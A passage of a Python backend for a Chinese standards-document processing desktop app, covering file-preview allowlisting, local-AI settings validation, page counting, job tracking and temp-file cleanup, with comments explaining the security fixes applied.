#!/usr/bin/env python3
# Copyright (c) 2026 The Forever CSF
# SPDX-License-Identifier: AGPL-3.0-or-later
# Additional terms: see 第二部分《标准处理系统 许可、隐私与免责说明》（AGPL-3.0 第 7 条附加条款）
import sys
import os
import json
import re
import sqlite3
import subprocess
import threading
import tempfile
import time
import uuid
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import urlparse, parse_qs


def hidden_proc_kwargs() -> dict:
    """返回隐藏子进程控制台窗口所需的 subprocess 参数。

    本程序以 console=False 打包，主进程没有控制台。此时调用 wmic / powershell.exe
    这类**控制台子系统**程序，若不加 CREATE_NO_WINDOW（或 STARTUPINFO+SW_HIDE），
    Windows 会为每个子进程单独新建一个可见控制台窗口 —— 用户看到的就是
    "突然冒出好几个黑色/蓝色窗口"（wmic 黑、PowerShell 深蓝）。
    """
    if os.name != "nt":
        return {}
    kwargs = {}
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = subprocess.SW_HIDE
        kwargs["startupinfo"] = si
    except Exception:
        pass
    try:
        kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW
    except Exception:
        pass
    return kwargs


# ── 预览文件白名单 ─────────────────────────────────────────
# /api/file 会把本地文件原样吐给浏览器（PDF.js 预览要用）。原先只拦了 ".."，
# 等于本机任意文件都能被读走（字典库、.app_settings.json、用户桌面文档），
# 响应还带 Access-Control-Allow-Origin: * —— 任意网页都能跨域把内容读走。
# 现在只允许读取"服务器确实交给过界面的文件"，或本程序自己的临时/导出目录。
# 本程序支持的文档扩展名（必须与 core/document_router.py 的 SUPPORTED 保持一致）
_SUPPORTED_EXTS = (
    ".pdf", ".doc", ".docx", ".docm",
    ".xls", ".xlsx", ".xlsm",
    ".ppt", ".pptx", ".pptm",
    ".txt", ".text", ".csv", ".tsv", ".md", ".markdown", ".log", ".rtf",
)
_PREVIEW_DOC_EXTS = _SUPPORTED_EXTS + (".pdf", ".doc", ".docx", ".xls", ".xlsx",
                     ".png", ".jpg", ".jpeg", ".bmp", ".gif", ".webp", ".tif", ".tiff")
_PREVIEW_ALLOWED = set()
_PREVIEW_ALLOWED_LOCK = threading.Lock()
_PREVIEW_ALLOWED_MAX = 20000
# JSON 接口的请求体上限（上传文件的 /api/upload 走 multipart，不受此限制）
_MAX_JSON_BODY = 64 * 1024 * 1024

# /api/upload 单次请求体上限（复审批 3-7）。
# 原先 int(Content-Length) 既无 try/except（非数字头直接抛异常），也无上限：
# self.rfile.read(N) 会把整包读进内存 → 一次超大请求即可把进程内存打满。
# 512MB 对"一次拖一批扫描件"足够宽松；要更大可在这里调。
_MAX_UPLOAD_BODY = 512 * 1024 * 1024

# /api/import_files 单次可接受的路径数上限（复审批 2-2 纵深防御）。
# 该接口返回的路径会被自动登记进预览白名单，限量可避免它被当成
# "批量枚举本机文档"的工具；正常拖拽/右键导入远达不到这个量级。
_IMPORT_PATH_MAX = 500

# ── 本地 AI 配置（设置页）─────────────────────────────────
DEFAULT_AI_URL = "http://localhost:8000/v1/chat/completions"
# 回传给前端的 Key 占位符：前端保存时若原样回传，表示"没有改动"，
# 后端会保留已存的真实 Key（避免明文 Key 出现在界面 / localStorage 里）
AI_KEY_MASK = "********"


def _mask_ai_key(settings: dict) -> dict:
    """把下发设置里的 AI Key 换成掩码，并标注是否已配置"""
    try:
        if not isinstance(settings, dict):
            return settings
        ai = settings.get("localAI")
        if not isinstance(ai, dict):
            return settings
        settings = dict(settings)
        ai = dict(ai)
        real = str(ai.get("apiKey") or "")
        ai["hasApiKey"] = bool(real)
        ai["apiKey"] = AI_KEY_MASK if real else ""
        settings["localAI"] = ai
        return settings
    except Exception:
        return settings


def _is_loopback_url(url: str) -> bool:
    """地址是否指向本机（localhost / 127.0.0.0/8 / ::1）。

    安全（审计中危）：这个功能的卖点是"本地 AI、内容不出本机"，而地址可经
    `/api/save_settings` 被本地页面改写 —— 允许任填 http(s) 就等于开了一条
    把文档内容发到任意服务器的通道。所以默认只放行回环地址。
    """
    try:
        from urllib.parse import urlparse
        host = (urlparse(url).hostname or "").strip().lower()
        if not host:
            return False
        if host in ("localhost", "::1", "[::1]"):
            return True
        return host.startswith("127.")
    except Exception:
        return False


# ── 页数统计（惰性 + 并行 + 缓存）──────────────────────────
# 为什么必须惰性：get_document_page_count() 会**真的打开并解析文件**
# （PDF 走 PyPDF2/fitz、Excel 走 openpyxl、docx 解包、pptx 解 zip）。
# 原实现在请求线程里逐个调用它，且文件夹扫描会对整棵目录树递归调用 ——
# 300 份 PDF 就是转圈几十秒到几分钟，没有进度、不能取消，而处理时还会再算一遍。
# 现在：扫描/上传接口只列文件（毫秒级返回，pages=0 表示"待统计"），
# 页数由界面分批请求本接口，服务端并行统计后增量回填。
_PAGE_COUNT_CACHE = {}
_PAGE_COUNT_CACHE_MAX = 20000
PAGE_COUNT_BATCH_MAX = 300      # 单次请求最多统计多少个，避免一次请求把服务占满


def _page_count_cached(path):
    """统计单个文件页数（带缓存）。失败返回 0 表示"未知"。"""
    try:
        st = os.stat(path)
        key = f"{os.path.normcase(os.path.abspath(path))}|{int(st.st_mtime)}|{st.st_size}"
    except Exception:
        key = os.path.normcase(os.path.abspath(str(path)))
    hit = _PAGE_COUNT_CACHE.get(key)
    if hit is not None:
        return hit
    try:
        pages = int(get_document_page_count(path))
    except Exception:
        pages = 0
    if len(_PAGE_COUNT_CACHE) >= _PAGE_COUNT_CACHE_MAX:
        _PAGE_COUNT_CACHE.clear()      # 到量就清，避免无界增长
    _PAGE_COUNT_CACHE[key] = pages
    return pages


def count_pages_parallel(paths, workers: int = 6):
    """并行统计多个文件的页数（0 = 未知/失败）。

    并行度取 6：这些活是 IO + CPU 混合，再高收益有限；
    且处理阶段本来就会开多线程，避免把机器压满。
    """
    from concurrent.futures import ThreadPoolExecutor, as_completed
    items = [p for p in (paths or []) if p][:PAGE_COUNT_BATCH_MAX]
    if not items:
        return []
    n = max(1, min(int(workers or 6), 16, len(items)))
    out = {}
    if n == 1:
        for p in items:
            out[p] = _page_count_cached(p)
    else:
        with ThreadPoolExecutor(max_workers=n) as ex:
            futs = {ex.submit(_page_count_cached, p): p for p in items}
            for fu in as_completed(futs):
                p = futs[fu]
                try:
                    out[p] = fu.result()
                except Exception:
                    out[p] = 0
    return [{"path": p, "pages": out.get(p, 0)} for p in items]


def _sanitize_ai_settings(data: dict) -> dict:
    """保存前处理 AI 配置：掩码 Key 原样保留旧值、地址做基本校验。

    这两件事都必须做：
      * 前端拿到的是掩码，若直接落盘会把真实 Key 覆盖成 "********"，
        用户下次处理时全部调用都 401；
      * 地址会被 requests.post 使用，非 http(s) 的值（file:// 之类）必须拒掉。
    """
    if not isinstance(data, dict):
        return data
    ai = data.get("localAI")
    if not isinstance(ai, dict):
        return data
    ai = dict(ai)
    old_key = ""
    try:
        path = _user_data(".app_settings.json")
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                old_key = str(((json.load(f) or {}).get("localAI") or {}).get("apiKey") or "")
    except Exception:
        pass
    incoming = str(ai.get("apiKey") or "")
    if incoming == AI_KEY_MASK:
        ai["apiKey"] = old_key
    url = str(ai.get("url") or "").strip()
    if url and not url.lower().startswith(("http://", "https://")):
        log_print(f"本地 AI 地址非法，已清空: {sanitize_log(url)}", "WARN")
        url = ""
    # 安全：默认只允许**本机回环**地址。非回环地址（局域网/公网）必须在设置页
    # 显式勾选「允许非本机地址」才接受 —— 否则任意本地页面都能借保存设置把
    # 文档内容导向它自己的服务器。
    if url and not _is_loopback_url(url) and not ai.get("allowRemote"):
        log_print(f"[安全] 本地 AI 地址非本机且未勾选允许，已拒绝: {sanitize_log(url)}", "WARN")
        ai["rejectedUrl"] = url          # 回传给前端提示，不静默吞掉
        url = ""
    # 复审批 2-4：allowRemote **不能只靠请求体里的一个布尔值** —— 否则任何能调用
    # 本地 API 的页面，一次 POST 就能把"本地 AI"改造成外发通道，之后所有文档
    # 内容都会送往那台服务器（本功能卖点恰恰是"内容不出本机"）。
    # 开启它需要管理员权限（与"关闭涉密模式"同级的第二道门）。
    if url and not _is_loopback_url(url) and ai.get("allowRemote"):
        allowed_remote = False
        try:
            from core.security_config import _check_admin
            allowed_remote = bool(_check_admin())
        except Exception:
            allowed_remote = False
        if not allowed_remote:
            log_print(f"[安全] 非本机 AI 地址需要管理员权限，已拒绝: {sanitize_log(url)}", "WARN")
            ai["rejectedUrl"] = url
            url = ""
    ai["url"] = url
    ai["allowRemote"] = bool(ai.get("allowRemote", False))
    ai["enabled"] = bool(ai.get("enabled", False))
    ai["model"] = str(ai.get("model") or "").strip() or "default"
    data = dict(data)
    data["localAI"] = ai
    return data


# ── 标准前缀开关 → 识别链路（C-1）──────────────────────────
def _apply_prefix_config() -> int:
    """把设置页「标准管理」的前缀开关真正注入识别链路。

    此前这套开关只写进 builtin_prefixes.json，而 `search_standard_names()` 用的是
    写死的正则表 —— 面板看起来生效、实际完全无效（关掉 ISO 照样识别，打开 SJ 永远
    识别不到），是最伤信任的一类问题。这里在启动与保存设置时把启用集合注入上去。

    规则：
      · 分组 enabled=False → 该组所有前缀不参与识别；
      · 组内单个前缀 value=False → 该前缀不参与识别；
      · .app_settings.json 的 customPrefixes 追加进来；
      · enableQStandard=False → 排除 Q/ 开头的企业标准前缀。
    返回实际编译出的正则条数。
    """
    try:
        from utils.helpers import set_enabled_prefixes
    except Exception as e:
        log_print(f"前缀注入失败（导入异常）: {e}", "WARN")
        return 0

    enabled = []
    try:
        # 生效集合 = 随包默认（新版会带 TB/T、ISO 等新分组）+ 用户在设置页的开关
        for gname, ginfo in (_effective_prefix_groups() or {}).items():
            if not isinstance(ginfo, dict):
                continue
            if ginfo.get("enabled", True) is False:
                continue
            pf = ginfo.get("prefixes")
            if isinstance(pf, dict):
                enabled.extend([k for k, v in pf.items() if v is not False])
            elif isinstance(pf, list):
                enabled.extend([p for p in pf if p])
    except Exception as e:
        log_print(f"读取前缀配置失败（将使用内置默认表）: {e}", "WARN")

    try:
        sp = _user_data(".app_settings.json")
        if os.path.exists(sp):
            with open(sp, "r", encoding="utf-8") as f:
                st = json.load(f) or {}
            for p in (st.get("customPrefixes") or []):
                if isinstance(p, str) and p.strip():
                    enabled.append(p.strip())
            if st.get("enableQStandard") is False:
                enabled = [p for p in enabled if not p.upper().startswith("Q/")]
    except Exception:
        pass

    # "全部关闭 → 回退完整默认表"是 helpers 里**有意的安全护栏**（避免一个前缀都
    # 不启用导致整份文档一条都识别不出来，那比开关不生效更糟），所以这里不改语义，
    # 但绝不能像原来那样**静默**发生 —— 那会让用户看到"我把开关都关了、它却认得
    # 更多"，是 UI 与后端自相矛盾。这里明确告警，并把事实回传出去供面板显示。
    # 注：这里只打印，**不再二次读盘**。先前版本为了区分"配置缺失"与"全关"
    # 又调了一次 _data_path()，在测试/迁移场景下产生副作用（_verify_prefix.py
    # 由 41/41 变 40/41）。两者最终都走同一护栏，文案如实覆盖两种情况即可。
    # 背景：helpers.set_enabled_prefixes('') 回退默认表是**有意的安全护栏**
    # （见 utils/helpers.py:136-141 与 _verify_prefix.py 的对应断言），
    # 不能改语义 —— 要消除的是"静默"，不是护栏本身。
    if not enabled:
        log_print("[前缀] 未读到任何启用前缀（配置缺失，或开关被全部关闭）→ "
                  "已按设计回退到内置默认范围识别。若想缩小识别范围，请至少保留一项。",
                  "WARN")

    n = set_enabled_prefixes(enabled)
    log_print(f"[前缀] 已注入 {len(set(p.upper() for p in enabled))} 个启用前缀"
              f"（编译出 {n} 条识别正则）", "INIT")
    return n


def allow_preview(paths):
    """登记允许通过 /api/file 预览的文件（由返回文件列表的接口自动调用）"""
    if not paths:
        return
    with _PREVIEW_ALLOWED_LOCK:
        for p in paths:
            if not p or not isinstance(p, str):
                continue
            try:
                _PREVIEW_ALLOWED.add(os.path.realpath(p))
            except Exception:
                pass
        if len(_PREVIEW_ALLOWED) > _PREVIEW_ALLOWED_MAX:
            _PREVIEW_ALLOWED.clear()


def _may_disable_classified() -> bool:
    """能否关闭涉密模式：必须具备管理员权限。

    安全（审计中危）：涉密模式是"防止资料外发"的最后一道闸门，而
    `/api/set_classified_mode` 原来只对**开启**校验管理员，**关闭**完全不校验 ——
    任意网页 / 本地未认证请求都能把它静默解除。关闭与开启一样需要管理员权限。
    """
    try:
        return bool(_check_admin())
    except Exception:
        return False


def _is_export_file(path) -> bool:
    """判断是否为本程序自己生成的导出文件（位于导出目录内）。

    安全（H5）：/api/save_dialog 会把该路径复制到用户选定的位置。原先只检查
    "文件是否存在"，于是任意网页都能借"保存导出文件"的对话框把本机**任意文件**
    复制出来（审计 H5）。这里限定为导出目录内的文件 —— 该接口的正常用途
    （保存刚生成的 xlsx）完全不受影响。
    """
    try:
        rp = os.path.realpath(path)
        rr = os.path.realpath(EXPORT_DIR)
        return rp != rr and rp.startswith(rr + os.sep)
    except Exception:
        return False


def is_preview_allowed(path) -> bool:
    """判断某路径是否允许被 /api/file 读取"""
    if not path:
        return False
    try:
        rp = os.path.realpath(path)
    except Exception:
        return False
    with _PREVIEW_ALLOWED_LOCK:
        if rp in _PREVIEW_ALLOWED:
            return True
    # 上传副本 / 导出目录是本程序自己的目录，始终允许
    for root in (TMP_DIR, EXPORT_DIR):
        try:
            rr = os.path.realpath(root)
            if rp.startswith(rr + os.sep):
                return True
        except Exception:
            pass
    return False

# PyInstaller 打包后资源路径修正
def _script_dir():
    """返回当前脚本所在目录（web/）"""
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, 'web')
    return os.path.dirname(os.path.abspath(__file__))

def _root_dir():
    """返回项目根目录（打包后为 exe 所在目录）"""
    if hasattr(sys, '_MEIPASS'):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

sys.path.insert(0, _root_dir())

from core.processor import DocumentProcessor
from core.preview_service import PreviewService
from core.security_config import (
    is_classified, allow_network_lookup, allow_feedback_webhook,
    allow_ai_enhance, sanitize_log, get_feedback_credentials,
    has_feedback_config, FEEDBACK_FALLBACK_EMAIL, set_classified_mode,
    install_firewall, remove_firewall, remove_windows_firewall_rules,
    query_firewall_log, get_firewall_status, _firewall_info,
    BlockedConnectionError, _check_admin, restart_as_admin,
)
from utils.helpers import (
    get_document_page_count, online_lookup_standard, batch_online_lookup,
    add_standard_to_main, add_standard_to_review,
    user_data_dir,  # 可写用户数据目录（%LOCALAPPDATA%\标准处理系统，含旧数据自动迁移）
    standard_no_of,  # 从"编号《名称》"取编号（补名匹配/统计重命名统一口径）
)


def _user_data(name: str = "") -> str:
    """用户数据（可写）文件路径；name 为空时返回数据目录本身。

    注意与 _root_dir() / _data_path() 的区别：
      · _root_dir()   程序目录，打包后可能位于 %ProgramFiles%（普通用户不可写）
      · _data_path()  随程序分发的**只读**资源（内置前缀库、协议 PDF 等）
      · 本函数        用户数据（设置、词典、教程状态、待导入队列）——全部可写
    """
    d = user_data_dir()
    return os.path.join(d, name) if name else d


def _auto_detect_workers(file_count: int, ocr_enabled: bool = True) -> int:
    """根据硬件配置自动计算最优并行线程数"""
    if file_count <= 1:
        return 1
    try:
        cpu_logical = os.cpu_count() or 4
    except Exception:
        cpu_logical = 4

    # 检测是否为物理核心（尝试获取更准确的值）—— 结果缓存，避免每次开始处理都探测
    global _PHYS_CORES
    if _PHYS_CORES is not None:
        return _recommend_workers(_PHYS_CORES, cpu_logical, file_count, ocr_enabled)
    try:
        # Windows: 用环境变量 USERNAME 判断不是 WSL，用 CPU 信息
        if sys.platform == "win32":
            # 必须隐藏窗口：wmic 是控制台程序，裸调会在每次"开始处理"时弹一个黑窗口
            r = subprocess.run(
                ["wmic", "cpu", "get", "NumberOfCores"],
                capture_output=True, text=True, timeout=3,
                **hidden_proc_kwargs(),
            )
            lines = [l.strip() for l in r.stdout.split("\n") if l.strip()]
            if len(lines) >= 2:
                phys_cores = int(lines[1])
            else:
                phys_cores = cpu_logical // 2 or 1
        elif sys.platform == "linux":
            r = subprocess.run(
                ["lscpu"], capture_output=True, text=True, timeout=3,
                **hidden_proc_kwargs(),
            )
            m = re.search(r"^CPU\(s\):\s+(\d+)", r.stdout, re.MULTILINE)
            phys_cores = int(m.group(1)) if m else (cpu_logical // 2 or 1)
        else:
            phys_cores = cpu_logical // 2 or 1
    except Exception:
        phys_cores = cpu_logical // 2 or 1
    _PHYS_CORES = phys_cores
    return _recommend_workers(phys_cores, cpu_logical, file_count, ocr_enabled)


def _recommend_workers(phys_cores: int, cpu_logical: int, file_count: int,
                       ocr_enabled: bool) -> int:
    """按物理核心数给出建议并行数（抽出来供缓存命中时复用）"""


    # 保守策略：OCR 很吃 CPU，用物理核心数的 1/2；纯文本用物理核心数
    if ocr_enabled:
        recommended = max(1, phys_cores // 2)
    else:
        recommended = max(1, phys_cores)

    # 上限 = 文件数（多了没用），下限 = 1
    recommended = min(recommended, file_count)
    # 上限 4 防止过多线程导致 UI 卡顿和内存压力
    recommended = min(recommended, 4)
    return recommended


# 物理核心数探测结果缓存（None = 尚未探测）
_PHYS_CORES = None

# 全局状态
results_cache = {}
progress_callback = None
status_callback = None
log_callback = None
progress_state = {"value": 0, "status": "", "logs": [], "done": True, "result": None}
cancel_flag = False  # 全局取消标志
# 任务代际：每开始一个新处理任务就 +1。后台线程（如联网补名）只在"自己那一代"
# 仍然有效时才写进度，避免上一个任务的补名线程把旧结果灌进新任务
# （现象：处理完 A 立刻开始 B，进度突然跳到 100% 并显示 A 的结果）。
_task_generation = 0
# 处理任务互斥锁：一次只允许一个处理任务运行
_process_lock = threading.Lock()

# ── 通用后台任务（异步导出等）──────────────────────────
# 原先导出等操作在请求内同步完成，用户只能干等且无法取消。
# 这里提供一个极简的任务表：提交后立即返回 job_id，前端轮询 /api/job 拿进度。
_jobs = {}
_jobs_lock = threading.Lock()
_JOBS_KEEP = 10  # 最多保留最近 N 个任务，避免无限增长


def _short_err(msg) -> str:
    """把错误文案里的完整本地路径换成文件名，避免把用户目录结构展示出来"""
    def _repl(m):
        base = os.path.basename(m.group(0).rstrip("\\/"))
        return f"…\\{base}" if base else "…"
    try:
        return re.sub(r"[A-Za-z]:\\[^\s\"']+", _repl, str(msg))
    except Exception:
        return str(msg)


def friendly_error(e):
    """把底层异常翻译成用户能看懂的说明 + 一句可操作建议（返回 (说明, 建议)）"""
    msg = str(e) or e.__class__.__name__
    # ① 先按异常类型判断（最可靠，不受文案影响）
    if isinstance(e, FileNotFoundError):
        return "文件不存在或已被移动", "请确认文件仍在原位置，或重新导入一次"
    if isinstance(e, PermissionError):
        return "文件被其它程序占用，无法读取", "请关闭正在打开该文件的 Word / Excel 后重试"
    if isinstance(e, MemoryError):
        return "内存不足", "建议减少同时处理的文件数量，或关闭其它占用内存的程序"
    if isinstance(e, TimeoutError):
        return "处理超时", "可尝试缩小页码范围或改用较小的文件后重试"
    if "用户已" in msg and "终止" in msg:
        return msg, ""

    # ② 再按文案匹配，但先把路径/文件名抠掉。
    #    否则像《超时补偿规定.docx》这种文件名会让任何失败都被误翻译成"处理超时"。
    probe = re.sub(r"[A-Za-z]:\\[^\s\"']*", " ", msg)
    probe = re.sub(r"[^\s\"']*\.(docx?|pdf|xlsx?|csv|txt)\b", " ", probe, flags=re.I)
    probe = re.sub(r"\"[^\"]*\"|'[^']*'", " ", probe)
    low = probe.lower()
    if "password" in low or "encrypt" in low or "decrypt" in low or "加密" in probe:
        return "文档已加密，无法读取内容", "请先解除文档密码/限制编辑后重新导入"
    if "no such file" in low or "filenotfound" in low or "找不到" in probe:
        return "文件不存在或已被移动", "请确认文件仍在原位置，或重新导入一次"
    if "permission" in low or "access is denied" in low or "正在使用" in probe:
        return "文件被其它程序占用，无法读取", "请关闭正在打开该文件的 Word / Excel 后重试"
    if "timeout" in low or "timed out" in low or "超时" in probe:
        return "处理超时", "可尝试缩小页码范围或改用较小的文件后重试"
    if "memory" in low or "内存" in probe:
        return "内存不足", "建议减少同时处理的文件数量，或关闭其它占用内存的程序"
    return _short_err(msg), ""


def _tutorial_state_path():
    return _user_data(".tutorial_state.json")


def _data_path(name: str) -> str:
    """返回随程序分发的数据文件路径（兼容两种打包布局）。

    打包后 `_root_dir()` 是 exe 所在目录，而 PyInstaller 6 的 onedir 会把
    spec 中 datas 指定的文件放进 `_internal/`（即 `sys._MEIPASS`）。
    只按 exe 目录找会"文件不存在" —— 实测发布版里 builtin_prefixes.json
    **只**存在于 `_internal/` 下，导致打包版的前缀库为空、保存也无效。
    这里两个位置都找：优先 exe 目录（可写、且是用户改过的），再回退到内置目录。
    """
    cands = [os.path.join(_root_dir(), name)]
    mei = getattr(sys, "_MEIPASS", None)
    if mei:
        cands.append(os.path.join(mei, name))
    for p in cands:
        if os.path.exists(p):
            return p
    return cands[0]


def _effective_prefix_groups() -> dict:
    """实际生效的标准前缀分组 = 随包内置默认 + 用户在设置页的开关。

    为什么这样拆（此前是"数据目录副本优先"，两个问题）：

      · builtin_prefixes.json 是**随程序分发的默认值**：新版本会带新的分组/前缀
        （例如行业标准 TB/T、国际标准 ISO）。若让用户数据目录里的旧副本优先，
        升级后新分组永远不生效 —— 表现为"装了新版，TB/T、ISO 还是识别不出来"。
      · 用户在设置页的开关另存 .app_settings.json 的 builtinPrefixes，
        只覆盖他们真正改过的键（分组 enabled / 单个前缀的开关）。

    于是：升级能拿到新默认值，用户的开关也不会被覆盖；写入也不再需要改内置文件
    （旧版把开关写进 builtin_prefixes.json，在 %ProgramFiles% 下还写不进去）。
    """
    groups = {}
    try:
        with open(_data_path("builtin_prefixes.json"), "r", encoding="utf-8") as f:
            groups = (json.load(f) or {}).get("groups") or {}
    except Exception as e:
        log_print(f"读取内置前缀库失败（将只使用用户自定义前缀）: {e}", "WARN")
    if not isinstance(groups, dict):
        groups = {}

    overrides = {}
    try:
        with open(_user_data(".app_settings.json"), "r", encoding="utf-8") as f:
            overrides = (json.load(f) or {}).get("builtinPrefixes") or {}
    except Exception:
        overrides = {}
    if not isinstance(overrides, dict):
        return groups

    out = {}
    for gname, ginfo in groups.items():
        g = dict(ginfo) if isinstance(ginfo, dict) else {}
        ov = overrides.get(gname)
        if isinstance(ov, dict):
            if "enabled" in ov:
                g["enabled"] = bool(ov["enabled"])
            opf, bpf = ov.get("prefixes"), g.get("prefixes")
            if isinstance(opf, dict) and isinstance(bpf, dict):
                merged = dict(bpf)
                for pk, pv in opf.items():
                    merged[pk] = pv is not False
                g["prefixes"] = merged
            elif isinstance(opf, list) and isinstance(bpf, list):
                g["prefixes"] = opf or bpf
        out[gname] = g
    # 兼容旧格式：用户覆盖里若出现内置库没有的分组，原样保留，避免丢数据
    for gname, ov in overrides.items():
        if gname not in out and isinstance(ov, dict):
            out[gname] = ov
    return out


def _app_version():
    try:
        with open(_data_path("version.txt"), encoding="utf-8") as f:
            return (f.read() or "").strip() or "unknown"
    except Exception:
        return "unknown"


def _read_tutorial_state():
    try:
        with open(_tutorial_state_path(), encoding="utf-8") as f:
            return json.load(f) or {}
    except Exception:
        return {}


def _write_tutorial_state(state):
    try:
        with open(_tutorial_state_path(), "w", encoding="utf-8") as f:
            json.dump(state, f, ensure_ascii=False, indent=2)
    except Exception as e:
        log_print(f"写入教程状态失败: {e}", "WARN")


def tutorial_should_show():
    """新安装 / 版本更新 / 做过初始化 → 需要展示教程。

    状态单独存在 .tutorial_state.json，避免被"保存设置"整包覆盖。
    返回 (是否展示, 当前版本, 原因)
    """
    version = _app_version()
    state = _read_tutorial_state()
    if state.get("pending"):
        return True, version, "reset"
    if state.get("done_version") != version:
        has_settings = os.path.exists(_user_data(".app_settings.json"))
        return True, version, ("updated" if has_settings else "new_install")
    return False, version, ""


def create_job(kind):
    """登记一个后台任务，返回任务状态字典"""
    job = {
        "id": str(uuid.uuid4()),
        "kind": kind,
        "value": 0,
        "status": "准备中",
        "done": False,
        "result": None,
        "error": None,
        "cancel": False,
        "started": time.time(),
    }
    with _jobs_lock:
        _jobs[job["id"]] = job
        if len(_jobs) > _JOBS_KEEP:
            # 只淘汰已结束的任务：淘汰正在跑的任务会导致前端拿到 404
            # "任务不存在或已过期"，而线程其实还在后台写文件
            finished = [k for k in _jobs if _jobs[k].get("done")]
            finished.sort(key=lambda x: _jobs[x]["started"])
            for k in finished[:max(0, len(_jobs) - _JOBS_KEEP)]:
                _jobs.pop(k, None)
    return job


def job_update(job, value=None, status=None, done=None, result=None, error=None):
    """线程安全地更新任务进度"""
    with _jobs_lock:
        if value is not None:
            job["value"] = value
        if status is not None:
            job["status"] = status
        if done is not None:
            job["done"] = done
        if result is not None:
            job["result"] = result
        if error is not None:
            job["error"] = error

TMP_DIR = os.path.join(tempfile.gettempdir(), 'standard_system')
# 导出文件临时目录
EXPORT_DIR = os.path.join(tempfile.gettempdir(), 'standard_system_exports')
# 反馈 Webhook 凭据来源（涉密模式自动禁用）：
#   1. 环境变量 DINGTALK_WEBHOOK_URL / DINGTALK_WEBHOOK_SECRET
#   2. 构建期注入的私有模块 _feedback_private.py
#      （读取逻辑见 core/security_config.py → get_feedback_credentials()）
#
# 【重要】本文件与整个公开源码仓库 **不含任何凭据**。
# 两种来源都未配置时（例如使用者从公开源码自行构建），
# /api/feedback 不会发送任何数据，而是引导用户改用邮箱
# （FEEDBACK_FALLBACK_EMAIL，与《许可、隐私与免责说明》第三十九条一致）。


def _cleanup_temp_dirs():
    """关闭时清理临时缓存目录，并清除残留的涉密模式防火墙规则"""
    # 清理本次运行可能残留的 Windows 防火墙规则。
    # 若当前会话已进入涉密模式，remove_firewall() 会在关闭前正常卸载；
    # 此处再清理一次兜底，防止涉密状态下异常退出后规则残留挡网。
    # remove_windows_firewall_rules() 按前缀"标准处理系统_涉密模式_*"精确匹配，
    # 不会误删其他程序的规则。
    try:
        from core.security_config import remove_windows_firewall_rules as _remove_wf
        _remove_wf()
    except Exception:
        pass
    import shutil
    for d in (TMP_DIR, EXPORT_DIR):
        if os.path.exists(d):
            try:
                shutil.rmtree(d, ignore_errors=True)
                log_print(f"已清理临时目录: {d}", "INIT")
            except Exception as e:
                log_print(f"清理临时目录失败 {d}: {e}", "WARN")
    # 同时清理所有零散临时文件。
    # 只清理"至少 10 分钟未改动"的：可能有另一个实例/另一个任务正在用这些
    # 中间图片做 OCR，直接删会让那一页识别失败、条目静默丢失。
    temp_root = tempfile.gettempdir()
    _stale_before = time.time() - 600
    try:
        for f in os.listdir(temp_root):
            fp = os.path.join(temp_root, f)
            is_pdf_page = f.startswith("pdf_page_") and f.endswith(".png")
            is_docx_img = (f.startswith("docx_img_")
                           and f.endswith((".png", ".jpg", ".jpeg")))
            is_ps_script = f in ("install_cm_std.ps1", "uninstall_cm_std.ps1")
            if not (is_pdf_page or is_docx_img or is_ps_script):
                continue
            try:
                if os.path.getmtime(fp) > _stale_before:
                    continue        # 可能正在被使用，跳过
                os.remove(fp)
            except Exception:
                pass
    except Exception:
        pass
    # 清理挂起导入文件（异常关机可能残留）
    pending_path = _user_data(".pending_import.json")
    if os.path.exists(pending_path):
        try:
            os.remove(pending_path)
        except Exception:
            pass


def log_print(msg, level="INFO"):
    """输出日志，涉密模式下自动清理敏感信息。

    注意：打日志绝不能把业务逻辑搞崩 —— Windows 控制台默认 GBK 编码，
    表情/特殊符号（如勾号、警告符号）会让 print 抛 UnicodeEncodeError。此前
    "联网补名"线程正是在打印"未查到 N 条"日志时异常终止，导致收尾到 100%
    与 missed_names 全部丢失（界面停在"联网补充中断"）。
    这里做两级兜底：encode 失败 → 用 errors='replace' 重打 → 仍失败则丢弃。
    """
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    safe_msg = sanitize_log(msg)
    line = f"[{ts}] [{level}] {safe_msg}"
    try:
        print(line, flush=True)
    except UnicodeEncodeError:
        try:
            _enc = getattr(sys.stdout, "encoding", None) or "utf-8"
            print(line.encode(_enc, errors="replace").decode(_enc, errors="replace"),
                  flush=True)
        except Exception:
            pass
    except Exception:
        pass
    if log_callback:
        try:
            log_callback(line)
        except Exception:
            pass


def _parse_multipart(body, boundary):
    """简易 multipart/form-data 解析器"""
    parts = []
    boundary_bytes = b'--' + boundary.encode()
    for part in body.split(boundary_bytes):
        part = part.strip()
        if not part or part == b'--':
            continue
        if part.startswith(b'\r\n'):
            part = part[2:]
        header_end = part.find(b'\r\n\r\n')
        if header_end == -1:
            continue
        headers = part[:header_end].decode('utf-8', errors='ignore')
        content = part[header_end + 4:]
        if content.endswith(b'\r\n'):
            content = content[:-2]
        m = re.search(r'filename="([^"]+)"', headers)
        if m:
            parts.append({"filename": m.group(1), "content": content})
    return parts


def run_process(task):
    """在后台线程中运行文档处理，更新全局进度状态。"""
    global progress_state, cancel_flag, _task_generation
    cancel_flag = False
    _task_generation += 1
    my_gen = _task_generation
    progress_state = {"value": 0, "status": "准备处理", "logs": [], "done": False, "result": None, "file_progresses": {}}

    def _alive():
        """本次任务是否仍是"当前任务"（已被新任务取代时不再写进度）"""
        return _task_generation == my_gen

    def _mark_cancelled():
        progress_state.update({"value": 0, "status": "已取消", "done": True, "cancelled": True})

    def _mark_failed(exc):
        import traceback
        err = traceback.format_exc()
        friendly, hint = friendly_error(exc)
        log_print(f"处理失败: {friendly}\n{err}", "ERROR")
        progress_state.update({
            "value": 0,
            "status": f"处理失败: {friendly}",
            "done": True,
            # traceback 只进日志，不下发给界面；另附一句可操作建议
            "result": {"error": friendly, "hint": hint, "tables": [], "text": "",
                       "stats": {}, "logs": [err]}
        })

    try:
        def _check_cancel():
            if cancel_flag:
                raise RuntimeError("用户已终止处理")
        # 每完成一个文件就把中间结果写入 progress_state（前端逐步展示）
        def _on_file_complete(file_path, part_result):
            if not _alive():
                return
            file_name = os.path.basename(file_path)
